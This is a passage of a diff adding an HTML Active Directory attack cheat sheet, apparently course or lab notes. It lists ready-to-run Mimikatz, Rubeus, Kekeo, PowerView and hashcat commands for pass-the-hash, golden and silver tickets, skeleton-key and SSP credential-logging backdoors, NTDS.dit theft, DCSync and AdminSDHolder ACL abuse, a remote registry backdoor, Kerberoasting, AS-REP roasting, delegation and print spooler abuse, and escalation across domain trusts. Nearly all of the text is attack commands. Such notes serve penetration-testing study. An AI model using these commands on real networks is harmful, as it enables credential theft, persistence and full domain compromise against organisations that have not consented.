+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="356" data-line-end="360">
+<p class="has-line-data" data-line-start="356" data-line-end="357">Perform PassTheHash (PTH) Attacks (Requires Elevated Shell Access; “RunAs Administrator”)</p>
+<pre><code class="has-line-data" data-line-start="358" data-line-end="360" class="language-powershell">Invoke-Mimimatz -Command <span class="hljs-string">'"sekurlsa::pth /user:Administrator /domain:organicsecurity.local /ntlm:c10c9ac42937a938c0ca8faf0af0af02 /run:powershell.exe"'</span>
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="360" data-line-end="367">
+<p class="has-line-data" data-line-start="360" data-line-end="361">Use the KRBTGT Hash to craft Golden Ticket (TGT)</p>
+<pre><code class="has-line-data" data-line-start="362" data-line-end="367" class="language-powershell">
+Invoke-Mimikatz -Command <span class="hljs-string">'"kerberos::golden /User:Administrator /domain:organicsecurity.local /sid:S-1-5-21-181111131-32111163-5111111 /krbtgt:c10c9ac42937a938c0ca8faf0af0af02 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ticket:golden_tkt.kirbi"'</span>
+
+Invoke-Mimikatz -Command <span class="hljs-string">'"kerberos::golden /User:Administrator /domain:organicsecurity.local /sid:S-1-5-21-181111131-32111163-5111111 /krbtgt:c10c9ac42937a938c0ca8faf0af0af02 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'</span>
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="367" data-line-end="372">
+<p class="has-line-data" data-line-start="367" data-line-end="368">Import the golden ticket into the memory</p>
+<pre><code class="has-line-data" data-line-start="370" data-line-end="372" class="language-powershell">Invoke-Mimikatz -Command <span class="hljs-string">'"kerberos::ptt golden_tkt.kirbi"'</span>
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="372" data-line-end="381">
+<p class="has-line-data" data-line-start="372" data-line-end="373">Crafting Silver Ticket (TGS) for CIFS Service (Requires service account creds/ machine account)</p>
+<pre><code class="has-line-data" data-line-start="375" data-line-end="381" class="language-powershell">Invoke-Mimikatz -Command <span class="hljs-string">'"kerberos::golden /User:Administrator /domain:organicsecurity.local /sid:S-1-5-21-182222111-321222112-53222211 /rc4:ff46a932423423427602342346f35 /target:dc.organicsecurity.local /service:CIFS/dc.organicsecurity.local /ptt"'</span>
+
+ls \\organicsecurity.local\c$
+
+NOTE: HOST - Scheduled Task | HOST + RPCSS - PowerShell remoting &amp; WMI | LDAP - DCSync
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="381" data-line-end="386">
+<p class="has-line-data" data-line-start="381" data-line-end="382">Perform Skeleton Key based persistance attack (Use Mimikatz as default password for all account)</p>
+<pre><code class="has-line-data" data-line-start="384" data-line-end="386" class="language-powershell">Invoke-Mimikatz -Command <span class="hljs-string">'"privilege::debug" "misc::skeleton"'</span> -ComputerName dcorp-dc
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="386" data-line-end="400">
+<p class="has-line-data" data-line-start="386" data-line-end="387">Backdoor SSP on DC to log credentials in cleartext in log file (c:\windows\system32\kiwissp.log)</p>
+<pre><code class="has-line-data" data-line-start="389" data-line-end="400" class="language-powershell"><span class="hljs-variable">$packages</span> = <span class="hljs-built_in">Get-ItemProperty</span> HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name <span class="hljs-string">'Security Packages'</span> | select -ExpandProperty <span class="hljs-string">'Security Packages'</span>
+
+<span class="hljs-variable">$packages</span> +=<span class="hljs-string">"mimilib"</span>
+
+<span class="hljs-built_in">Set-ItemProperty</span> HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name <span class="hljs-string">'Security Packages'</span> -Value <span class="hljs-variable">$packages</span>
+<span class="hljs-built_in">Set-ItemProperty</span> HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name <span class="hljs-string">'Security Packages'</span> -Value <span class="hljs-variable">$packages</span>
+
+  OR
+
+Invoke-Mimikatz -Command <span class="hljs-string">'"misc::memssp"'</span>
+
+</code></pre>
+</li>
+</ul>
+<p class="has-line-data" data-line-start="400" data-line-end="401"><strong>Read Protected file from the disk</strong></p>
+<ul>
+<li class="has-line-data" data-line-start="402" data-line-end="407">
+<p class="has-line-data" data-line-start="402" data-line-end="403">Read NTDS.dit file (Only on DC, Containes the credentials of the AD Users)</p>
+<pre><code class="has-line-data" data-line-start="405" data-line-end="407" class="language-powershell">Invoke-NinjaCopy C:\Windows\System32\ntds.dit C:\ntds.dit
+
+</code></pre>
+</li>
+</ul>
+<p class="has-line-data" data-line-start="407" data-line-end="408"><strong>Read Protected file from the disk</strong></p>
+<ul>
+<li class="has-line-data" data-line-start="409" data-line-end="414">
+<p class="has-line-data" data-line-start="409" data-line-end="410">Identify the Applocker Policy to bypass the contrained jail shell</p>
+<pre><code class="has-line-data" data-line-start="412" data-line-end="414" class="language-powershell">Get-AppLockerPolicy -Effective  | select -ExpandProperty RuleCollections
+
+</code></pre>
+</li>
+</ul>
+<p class="has-line-data" data-line-start="414" data-line-end="415"><strong>AdminSDHolder</strong></p>
+<ul>
+<li class="has-line-data" data-line-start="416" data-line-end="421">
+<p class="has-line-data" data-line-start="416" data-line-end="417">Get the ACLs defines on the AdminSDHolder object</p>
+<pre><code class="has-line-data" data-line-start="419" data-line-end="421" class="language-powershell">Get-ObjectAcl -ADSprefix <span class="hljs-string">"CN=AdminSDHolder,CN=System"</span> -ResolveGUIDs | select AccessControlType, IdentityReference, ActiveDirectoryRights
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="421" data-line-end="426">
+<p class="has-line-data" data-line-start="421" data-line-end="422">Assign GenericAll rights to current (User01) account on AdminSDHolder container</p>
+<pre><code class="has-line-data" data-line-start="424" data-line-end="426" class="language-powershell">Add-ObjectAcl -TargetADSprefix <span class="hljs-string">"CN=AdminSDHolder,CN=system"</span> -PrincipalSamAccountName User01 -Rights All -verbose
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="426" data-line-end="433">
+<p class="has-line-data" data-line-start="426" data-line-end="427">Assign ResetPassword rights to (User01) account on AdminSDHolder container</p>
+<pre><code class="has-line-data" data-line-start="429" data-line-end="433" class="language-powershell">Add-ObjectAcl -TargetADSprefix <span class="hljs-string">"CN=AdminSDHolder,CN=System"</span> -PrincipalSamAccountName student379  -Rights ResetPassword -verbose
+
+Set-DomainUserPassword -Identity testuser -AccountPassword (<span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">"Pass@123"</span> -AsPlainText -Force) -Verbose
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="433" data-line-end="438">
+<p class="has-line-data" data-line-start="433" data-line-end="434">Check if “User01” has any ACL set on “Domain Admins” group</p>
+<pre><code class="has-line-data" data-line-start="436" data-line-end="438" class="language-powershell">Get-ObjectAcl -SamAccountName <span class="hljs-string">"Domain Admins"</span>  | ?{<span class="hljs-variable">$_</span>.IdentityReference <span class="hljs-operator">-like</span> <span class="hljs-string">"*User01*"</span>}
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="438" data-line-end="442">
+<p class="has-line-data" data-line-start="438" data-line-end="439">Assign DCSync right to “User01” on the current domain</p>
+<pre><code class="has-line-data" data-line-start="440" data-line-end="442" class="language-powershell">Add-ObjectAcl -TargetADSpath <span class="hljs-string">"DC=dollarcorp,DC=moneycorp,DC=local"</span> -PrincipalSamAccountName User01 -Rights DCSync -Verbose
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="442" data-line-end="447">
+<p class="has-line-data" data-line-start="442" data-line-end="443">Assign Full rights to the root domain</p>
+<pre><code class="has-line-data" data-line-start="445" data-line-end="447" class="language-powershell">Add-ObjectAcl -TargetADSpath <span class="hljs-string">"DC=dollarcorp,DC=moneycorp,DC=local"</span> -PrincipalSamAccountName User01 -Rights ALL -Verbose
+
+</code></pre>
+</li>
+</ul>
+<p class="has-line-data" data-line-start="447" data-line-end="448"><strong>ACL - Security Descriptors &amp; Remote Registry</strong></p>
+<ul>
+<li class="has-line-data" data-line-start="449" data-line-end="457">
+<p class="has-line-data" data-line-start="449" data-line-end="450">Add remote registery backdoor to access the DC without admin rights</p>
+<pre><code class="has-line-data" data-line-start="452" data-line-end="457" class="language-powershell">Add-RemoteRegBackdoor -ComputerName dcorp-dc -user orangesecurity\user01
+Get-RemoteMachineAccountHash -Computer dcorp-dc -verbose
+Get-RemoteLocalAccountHash -Computer dcorp-dc -verbose
+Get-RemoteCachedCredential -Computer dcorp-dc -verbose
+
+</code></pre>
+</li>
+</ul>
+<h1 class="code-line" data-line-start=457 data-line-end=458 ><a id="Domain_Privilege_Escalation_457"></a>Domain Privilege Escalation</h1>
+<p class="has-line-data" data-line-start="459" data-line-end="460"><strong>Kerberosting</strong></p>
+<ul>
+<li class="has-line-data" data-line-start="461" data-line-end="466">
+<p class="has-line-data" data-line-start="461" data-line-end="462">Identify the user/service accounts vulnerable to kerberosting attack</p>
+<pre><code class="has-line-data" data-line-start="464" data-line-end="466" class="language-powershell">Get-NetUser -spn | select cn, samaccountname, serviceprincipalname
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="466" data-line-end="473">
+<p class="has-line-data" data-line-start="466" data-line-end="467">Method 1: Fetch TGS of the vulnerable account (SPN name should match extactly as in the user attribute)</p>
+<pre><code class="has-line-data" data-line-start="469" data-line-end="473" class="language-powershell">.\Rubeus.exe kerberoast /spn:<span class="hljs-string">"MSSQLSvc/sqlserver.organicsecurity.local:1433"</span> /user:dcorp\sqladmin /domain:organicsecurity.local /dc:dc.organicsecurity.local  format:hashcat /outfile:mssqlsvc_tgs.hash
+
+Get-DomainSPNTicket -SPN <span class="hljs-string">"MSSQLSvc/dcorp-mgmt.organicsecurity.local"</span> -OutputFormat Hashcat
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="473" data-line-end="478">
+<p class="has-line-data" data-line-start="473" data-line-end="474">Crack the kerberost hash using Hashcat utility</p>
+<pre><code class="has-line-data" data-line-start="475" data-line-end="478" class="language-powershell">hashcat.exe -a <span class="hljs-number">0</span> -m <span class="hljs-number">13100</span> sql_kerb.txt <span class="hljs-number">500</span>-worst-passwords.txt
+
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="478" data-line-end="486">
+<p class="has-line-data" data-line-start="478" data-line-end="479">Method 2: Extract TGS from memory and crack it using tgsrepcrack</p>
+<pre><code class="has-line-data" data-line-start="480" data-line-end="486" class="language-powershell">Get-NetUser -SPN | Request-SPNTicket
+klist
+Invoke-Mimikatz -Command <span class="hljs-string">'"kerberos::list /export"'</span>
+.\tgsrepcrack.py .\<span class="hljs-number">10</span>k-worst-pass.txt .\tickets\<span class="hljs-number">7</span>-<span class="hljs-number">40</span>a10000-sqluser@MSSQLSvc~sqlserver.dc.organicsecurity.local.kirbi
+
+
+</code></pre>
+</li>
+</ul>
+<p class="has-line-data" data-line-start="486" data-line-end="487"><strong>Targetted Kerberosting</strong></p>
+<ul>
+<li class="has-line-data" data-line-start="488" data-line-end="494">
+<p class="has-line-data" data-line-start="488" data-line-end="489">Find the account having write privileges for current user</p>
+<pre><code class="has-line-data" data-line-start="491" data-line-end="494" class="language-powershell">Invoke-ACLScanner  -ResolveGUID | ?{<span class="hljs-variable">$_</span>.IdentityReferencename <span class="hljs-operator">-like</span> <span class="hljs-string">"*user01"</span>}
+Invoke-ACLScanner  -ResolveGUID | ?{<span class="hljs-variable">$_</span>.IdentityReferencename <span class="hljs-operator">-like</span> <span class="hljs-string">"rdpusers"</span>}
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="494" data-line-end="500">
+<p class="has-line-data" data-line-start="494" data-line-end="495">Perform targetted SPN, where the current user has GenericAll or Write Property privilege</p>
+<pre><code class="has-line-data" data-line-start="497" data-line-end="500" class="language-powershell">Set-DomainObject -Identity testuser01 -Set @{serviceprincipalname=<span class="hljs-string">'ops/test'</span>}
+
+
+</code></pre>
+</li>
+</ul>
+<p class="has-line-data" data-line-start="500" data-line-end="501"><strong>ASREP-Roasting</strong></p>
+<ul>
+<li class="has-line-data" data-line-start="502" data-line-end="507">
+<p class="has-line-data" data-line-start="502" data-line-end="503">Enumerate user account where Kerberos Preauth is disabled</p>
+<pre><code class="has-line-data" data-line-start="505" data-line-end="507" class="language-powershell">Get-DomainUser -PreauthNotRequired -Verbose
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="507" data-line-end="514">
+<p class="has-line-data" data-line-start="507" data-line-end="508">Method 1: Fetch the AS-REP Response using Rubeus</p>
+<pre><code class="has-line-data" data-line-start="510" data-line-end="514" class="language-powershell">.\Rubeus.exe asreproast
+.\Rubeus.exe asreproast /format:hashcat /user:user01 /outfile:hash.txt
+.\Rubeus.exe asreproast /format:hashcat /outfile:hash.txt
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="514" data-line-end="520">
+<p class="has-line-data" data-line-start="514" data-line-end="515">Method 2: Use ASREPRoast Powershell script</p>
+<pre><code class="has-line-data" data-line-start="517" data-line-end="520" class="language-powershell">. .\ASREPRoast.ps1
+Get-ASREPHash -UserName vpn379user
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="520" data-line-end="525">
+<p class="has-line-data" data-line-start="520" data-line-end="521">Crack the hash using Hashcat</p>
+<pre><code class="has-line-data" data-line-start="522" data-line-end="525" class="language-powershell">hashcat.exe -a <span class="hljs-number">0</span> -m <span class="hljs-number">18200</span> asrep-roast.txt <span class="hljs-number">500</span>-worst-passwords.txt 
+
+
+</code></pre>
+</li>
+</ul>
+<p class="has-line-data" data-line-start="525" data-line-end="526"><strong>Targeted ASREP-Roasting</strong></p>
+<ul>
+<li class="has-line-data" data-line-start="527" data-line-end="533">
+<p class="has-line-data" data-line-start="527" data-line-end="528">Determine if the current user has permission to set User Account Control flag for another user</p>
+<pre><code class="has-line-data" data-line-start="530" data-line-end="533" class="language-powershell">Invoke-ACLScanner -ResolveGUIDs | ?{<span class="hljs-variable">$_</span>.IdentityReference <span class="hljs-operator">-like</span> <span class="hljs-string">'S-1-5-21-37422221-831111-1111111-1*'</span>}
+Invoke-ACLScanner -ResolveGUIDs | ?{<span class="hljs-variable">$_</span>.IdentityReferenceName <span class="hljs-operator">-match</span> <span class="hljs-string">'User01'</span>}
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="533" data-line-end="539">
+<p class="has-line-data" data-line-start="533" data-line-end="534">Set the UserAccountControl bit to disable kerberos preauth for given account</p>
+<pre><code class="has-line-data" data-line-start="536" data-line-end="539" class="language-powershell">Set-DomainObject -Identity User01 -XOR @{useraccountcontrol=<span class="hljs-number">4194304</span>}
+
+
+</code></pre>
+</li>
+</ul>
+<h1 class="code-line" data-line-start=539 data-line-end=540 ><a id="Delegation_539"></a>Delegation</h1>
+<p class="has-line-data" data-line-start="541" data-line-end="542"><strong>Unconstrained Delegation</strong></p>
+<ul>
+<li class="has-line-data" data-line-start="543" data-line-end="556">
+<p class="has-line-data" data-line-start="543" data-line-end="544">Identify Computer Objects where Unconstrained Delegation is allowed</p>
+<pre><code class="has-line-data" data-line-start="546" data-line-end="556" class="language-powershell">Get-NetComputer -Unconstrained | select cn
+
+  Note: 
+  
+  <span class="hljs-number">1</span>) Use bloodhound to identify the attack path to compromise the Computer where unconstrained delegation is allowed. Also, you can find out the user account who has local admmin rights on the given system
+
+  <span class="hljs-number">2</span>) Wait <span class="hljs-keyword">for</span> DA user to login, and dump the cached TGT ticket <span class="hljs-keyword">for</span> high privileged user using Mimikatz
+
+  <span class="hljs-number">3</span>) Alternately, <span class="hljs-keyword">if</span> there is Print Sppoler service installed on DC, it can be expoited to capture NTLM hash of DC machine account. It can be further used to craft Silver ticket <span class="hljs-keyword">for</span> given service
+
+</code></pre>
+</li>
+</ul>
+<p class="has-line-data" data-line-start="556" data-line-end="557"><strong>Print Spooler attack</strong></p>
+<ul>
+<li class="has-line-data" data-line-start="558" data-line-end="563">
+<p class="has-line-data" data-line-start="558" data-line-end="559">Checked Print Service is running on the DC</p>
+<pre><code class="has-line-data" data-line-start="561" data-line-end="563" class="language-powershell">dir \\dc.organicsecurity.local\pipe\spoolss
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="563" data-line-end="568">
+<p class="has-line-data" data-line-start="563" data-line-end="564">Execute the Rubeus.exe for continues monitoring of TGT/TGS tickets</p>
+<pre><code class="has-line-data" data-line-start="566" data-line-end="568" class="language-powershell">.\Rubeus.exe monitor /interval:<span class="hljs-number">2</span> /nowrap
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="568" data-line-end="573">
+<p class="has-line-data" data-line-start="568" data-line-end="569">Execute MSRPRN.exe to trigger printspooler server iinto authenticating with our conpromised server having unconstrained delegation enabled to capture DC machine account hash</p>
+<pre><code class="has-line-data" data-line-start="571" data-line-end="573" class="language-powershell">.\ms_rprn.exe \\dc.organgesecurity.local \\appserver.organicsecurity.local
+
+</code></pre>
+</li>
+</ul>
+<p class="has-line-data" data-line-start="573" data-line-end="574"><strong>Constrained Delegation</strong></p>
+<ul>
+<li class="has-line-data" data-line-start="575" data-line-end="581">
+<p class="has-line-data" data-line-start="575" data-line-end="576">Identify the user and computer account having constrained delegation enabled</p>
+<pre><code class="has-line-data" data-line-start="578" data-line-end="581" class="language-powershell">Get-NetUser -TrustedToAuth | select cn, samaccountname, msds-allowedtodelegateto
+Get-NetComputer -TrustedToAuth | select cn, msds-allowedtodelegateto
+
+</code></pre>
+</li>
+</ul>
+<p class="has-line-data" data-line-start="581" data-line-end="582"><strong>[I] Constrained Delegation - User/Service Account</strong></p>
+<ul>
+<li class="has-line-data" data-line-start="583" data-line-end="605">
+<p class="has-line-data" data-line-start="583" data-line-end="584">Method 1: User Account exploitation using Kekeo</p>
+<ul>
+<li class="has-line-data" data-line-start="585" data-line-end="590">
+<p class="has-line-data" data-line-start="585" data-line-end="586">Request a TGT for for vulnerable account using NTLM hash</p>
+<pre><code class="has-line-data" data-line-start="588" data-line-end="590" class="language-powershell">.\Kekeo.exe tgt::ask user:websvc /domain:organicsecurity.local /rc4:cc096515667862789729156f
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="590" data-line-end="595">
+<p class="has-line-data" data-line-start="590" data-line-end="591">Use the TGT to fetch delegable TGS for second service</p>
+<pre><code class="has-line-data" data-line-start="593" data-line-end="595" class="language-powershell">.\kekeo.exe tgs::s4u /tgt:<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="cf9b889b90b8aaadbcb9ac8fa0bda8aea1a6acbcaaacbabda6bbb6e1a3a0acaea3">[email&#160;protected]</a><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="0a556178687e6d7e7465786d6b646369796f697f78637e73246665696b664a65786d6b646369796f697f78637e73246665696b66246163786863">[email&#160;protected]</a> /user:<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="753411181c1b1c06010714011a07351a0712141b1c1606101600071c010c5b191a161419">[email&#160;protected]</a> /service:cifs dcorp mssql.organicsecurity.local
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="595" data-line-end="600">
+<p class="has-line-data" data-line-start="595" data-line-end="596">Inject the ticket into memory using Mimikatz</p>
+<pre><code class="has-line-data" data-line-start="598" data-line-end="600" class="language-powershell">Invoke-Mimikatz -Command <span class="hljs-string">'"kerberos::ptt <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="7d293a2e223c19101413140e090f1c09120f3d120f1a1c13141e0e181e080f1409045311121e1c11">[email&#160;protected]</a>@organicsecurity.local_cifs~dcorp-mssql.organicsecurity.local@organicsecurity.local.kirbi"'</span>
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="600" data-line-end="605">
+<p class="has-line-data" data-line-start="600" data-line-end="601">Access the CIFS Service</p>
+<pre><code class="has-line-data" data-line-start="603" data-line-end="605" class="language-powershell">dir \\dcorp-dc.organicsecurity.local
+
+</code></pre>
+</li>
+</ul>
+</li>
+<li class="has-line-data" data-line-start="605" data-line-end="619">
+<p class="has-line-data" data-line-start="605" data-line-end="606">Method 2: User Account exploitation using Rubeus</p>
+<ul>
+<li class="has-line-data" data-line-start="607" data-line-end="613">
+<p class="has-line-data" data-line-start="607" data-line-end="608">Use Rubeus to directly fetch TGS for delegated service in single command</p>
+<pre><code class="has-line-data" data-line-start="610" data-line-end="613" class="language-powershell">.\Rubeus.exe s4u /user:websvc /rc4:cc098f204c892347832947324749156f
+/impersonateuser:Administrator /msdsspn :<span class="hljs-string">"dcorp_mssql.organicsecurity.local"</span> /ptt
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="613" data-line-end="619">
+<p class="has-line-data" data-line-start="613" data-line-end="614">Access the CIFS Service</p>
+<pre><code class="has-line-data" data-line-start="616" data-line-end="619" class="language-powershell">dir \\dcorp-dc.organicsecurity.local
+
+
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<p class="has-line-data" data-line-start="619" data-line-end="620"><strong>[II] Constrained Delegation - Machine Account</strong></p>
+<ul>
+<li class="has-line-data" data-line-start="622" data-line-end="642">
+<p class="has-line-data" data-line-start="622" data-line-end="623">Method 1: Machine Account exploitation using Kekeo</p>
+<ul>
+<li class="has-line-data" data-line-start="624" data-line-end="629">
+<p class="has-line-data" data-line-start="624" data-line-end="625">Similar to above scenario, we can use the NTLM hash of machine account to request TGT</p>
+<pre><code class="has-line-data" data-line-start="627" data-line-end="629" class="language-powershell">kekeo tgt::ask /user:dcorp adminsrv /domain:organicsecurity.local /rc4:<span class="hljs-number">1</span>fadb1b13232132323389e6f34c67
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="629" data-line-end="634">
+<p class="has-line-data" data-line-start="629" data-line-end="630">Use TGT received above to request for TGS. Now, here we can request TGS for service which are not listed under msds-allowedto delegateto but is running under the same service/system account</p>
+<pre><code class="has-line-data" data-line-start="632" data-line-end="634" class="language-powershell">kekeo tgs::s4u /tgt:TGT_dcorp-adminsrv$ @organicsecurity.local_krbtgt~organicsecurity.local@organicsecurity.local.kirbi /user:<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b8f9dcd5d1d6d1cbcccad9ccd7caf8d7cadfd9d6d1dbcbdddbcdcad1ccc196d4d7dbd9d4">[email&#160;protected]</a> /service:time/dcorp-dc.organicsecurity.local | ldap dcorp-dc.organicsecurity.local
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="634" data-line-end="642">
+<p class="has-line-data" data-line-start="634" data-line-end="635">Inject the TGS ticket and perform DCSync attack</p>
+<pre><code class="has-line-data" data-line-start="637" data-line-end="642" class="language-powershell">Invoke-Mimikatz -Command <span class="hljs-string">'"kerberos::ptt <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="772330242836131a1e191e040305160318053718051016191e1404121402051e030e591b1814161b">[email&#160;protected]</a>@organicsecurity.local_ldap~dcorp-dc.organicsecurity.local@organicsecurity.local_ALT.kirbi"'</span>
+
+Invoke-Mimikatz -Command <span class="hljs-string">'"lsadump::dcsync /user:dcorp\krbtgt "'</span>
+
+
+</code></pre>
+</li>
+</ul>
+</li>
+<li class="has-line-data" data-line-start="642" data-line-end="654">
+<p class="has-line-data" data-line-start="642" data-line-end="643">Method 2: Machine Account exploitation using Rubeus</p>
+<ul>
+<li class="has-line-data" data-line-start="644" data-line-end="649">
+<p class="has-line-data" data-line-start="644" data-line-end="645">Request the TGS for alternate service (not listed in delegation attribute)</p>
+<pre><code class="has-line-data" data-line-start="647" data-line-end="649" class="language-powershell">.\Rubeus.exe s4u /user:dcorp-adminsrv$ /rc4:<span class="hljs-number">1</span>fadb134234234e6f34c67 /impersonateuser:Administrator /msdsspn:<span class="hljs-string">"time/dcorp.dc.organicsecurity.local"</span> /altservice:ldap /ptt
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="649" data-line-end="654">
+<p class="has-line-data" data-line-start="649" data-line-end="650">Use it to perform DCSync attack</p>
+<pre><code class="has-line-data" data-line-start="652" data-line-end="654" class="language-powershell">Invoke-Mimikatz -Command <span class="hljs-string">'"lsadump::dcsync /user:dcorp\krbtgt"'</span>
+
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<h1 class="code-line" data-line-start=654 data-line-end=655 ><a id="Privilege_Escation__Domain_Trusts_654"></a>Privilege Escation - Domain Trusts</h1>
+<p class="has-line-data" data-line-start="657" data-line-end="658"><strong>CASE 1: Within Forest: Escalating from Child Domain to Root Domain</strong></p>
+<p class="has-line-data" data-line-start="660" data-line-end="661">A) Escalating from child domain to parent/root domain using Trust key/ticket</p>
+<ul>
+<li class="has-line-data" data-line-start="662" data-line-end="668">
+<p class="has-line-data" data-line-start="662" data-line-end="663">Step 1: Fetching the Trust keys between child and parent domain</p>
+<pre><code class="has-line-data" data-line-start="665" data-line-end="668" class="language-powershell">Invoke-Mimikatz -Command <span class="hljs-string">'"lsadump::trust /patch"'</span> -ComputerName dcorp-dc
+Invoke-Mimikatz -Command <span class="hljs-string">'"lsadump::dcsync /user:dcorp\mcorp$"'</span>
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="668" data-line-end="675">
+<p class="has-line-data" data-line-start="668" data-line-end="669">Step 2: Crafting the Inter-realm-TGT ticket</p>
+<pre><code class="has-line-data" data-line-start="671" data-line-end="675" class="language-powershell">Invoke-Mimikatz -Command <span class="hljs-string">'"Kerberos::golden /user:Administrator /domain:organicsecurity.local /sid:SID_OF_CURRENT_DOMAIN /sids:SID_OF_ENTERPRISE_ADMINS_FROM_PARENT_DOMAIN  /rc4:TRUST_KEY /service:krbtgt /target:mango.local /ticket:trust_tkt.kirbi"'</span>
+
+Invoke-Mimikatz -Command <span class="hljs-string">'"Kerberos::golden /user:Administrator /domain:organicsecurity.local /sid:S-1-5-21-1874506631-3219952063-538504511  /sids:S-1-5-21-280534878-1496970234-700767426-519  /rc4:c04dfec49ae75f81d9ff849e4c4f5be9 /service:krbtgt  /target:moneycorp.local /ticket:trust_orangesecurity_tgt.kirbi"'</span>
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="675" data-line-end="680">
+<p class="has-line-data" data-line-start="675" data-line-end="676">STEP 3: Use the Inter-Realm TGT to fetch TGS for given service from another forest</p>
+<pre><code class="has-line-data" data-line-start="678" data-line-end="680" class="language-powershell">.\Rubeus.exe asktgs /ticket:trust_Dollar2moneycorp_tgt.kirbi /service:CIFS/mcorp-dc.moneycorp.local  /dc:mcorp-dc.moneycorp.local  /ptt
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="680" data-line-end="687">
+<p class="has-line-data" data-line-start="680" data-line-end="681">STEP 4: Access the CIFS service from another forest</p>
+<pre><code class="has-line-data" data-line-start="683" data-line-end="687" class="language-powershell">ls \\mcorp-dc.moneycorp.local\c$
+
+
+
+</code></pre>
+</li>
+</ul>
+<p class="has-line-data" data-line-start="687" data-line-end="688">B) Escalating from child domain to parent/root domain using KRBTGT Hash</p>
+<ul>
+<li class="has-line-data" data-line-start="689" data-line-end="694">
+<p class="has-line-data" data-line-start="689" data-line-end="690">STEP 1: Fetch the NTLM hash of KRBTGT Account</p>
+<pre><code class="has-line-data" data-line-start="692" data-line-end="694" class="language-powershell">Invoke-Mimikatz -Command <span class="hljs-string">'"lsadump::lsa /patch"'</span>
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="694" data-line-end="701">
+<p class="has-line-data" data-line-start="694" data-line-end="695">STEP 2: Use it to craft the Golden ticket with SID set to Enterprise Admin</p>
+<pre><code class="has-line-data" data-line-start="697" data-line-end="701" class="language-powershell">Invoke-Mimikatz -Command <span class="hljs-string">'"Kerberos::golden /user:Administrator /domain:organicsecurity.local /sid:SID_OF_CURRENT_DOMAIN /sids:SID_OF_ENTERPRISE_ADMINS_FROM_PARENT_DOMAIN  /krbtgt:krbtgt_ntlm_hash  /target:moneycorp.local /ticket:trust_tkt.kirbi"'</span>
+
+Invoke-Mimikatz -Command <span class="hljs-string">'"Kerberos::golden /user:Administrator /domain:organicsecurity.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519  /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /target:mango.local  /ticket:trust_organicsecurity_golden_tgt.kirbi"'</span>
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="701" data-line-end="708">
+<p class="has-line-data" data-line-start="701" data-line-end="702">STEP 3: Inject the ticket into the memory</p>
+<pre><code class="has-line-data" data-line-start="704" data-line-end="708" class="language-powershell">Invoke-Mimikatz -Command <span class="hljs-string">'"kerberos::ptt trust_organicsecurity_golden_tgt.kirbi"'</span>
+
+
+
+</code></pre>
+</li>
+</ul>
+<p class="has-line-data" data-line-start="708" data-line-end="709">C) Stealthier Method for creating Golden ticket using DC Account</p>
+<ul>
+<li class="has-line-data" data-line-start="710" data-line-end="712">
+<p class="has-line-data" data-line-start="710" data-line-end="711">STEP 1: Fetch the NTLM hash of krbtgt account</p>
+</li>
+<li class="has-line-data" data-line-start="712" data-line-end="722">
+<p class="has-line-data" data-line-start="712" data-line-end="713">STEP 2: Use mimikatz to craft TGT ticket with SIDS set to Domain Controllers &amp; EnterPrise DC</p>
+<pre><code class="has-line-data" data-line-start="715" data-line-end="722" class="language-powershell">Invoke-Mimikatz -Command <span class="hljs-string">'"Kerberos::golden /user:DCORP-DC$/domain:dollarcorp.moneycorp.local /sid:SID_OF_CURRENT_DOMAIN /sids:SID_OF_DOMAIN_CONTROLLERS_ENTERPRISE_DC_FROM_PARENT_DOMAIN  /krbtgt:krbtgt_ntlm_hash  /target:moneycorp.local /ticket:trust_tkt.kirbi"'</span>
+
